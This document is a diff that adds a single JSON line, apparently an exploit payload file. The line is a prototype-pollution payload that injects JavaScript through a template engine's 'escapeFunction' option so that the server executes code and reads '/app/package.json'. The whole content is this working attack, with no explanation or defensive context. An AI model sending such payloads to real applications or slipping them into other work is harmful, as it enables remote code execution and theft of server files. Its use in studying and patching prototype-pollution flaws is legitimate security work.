@@ -1,0 +1,1 @@
+{"__proto__":{"client":true,"escapeFunction":"1;return process.mainModule.require('fs').readFileSync('/app/package.json','utf8');"}}
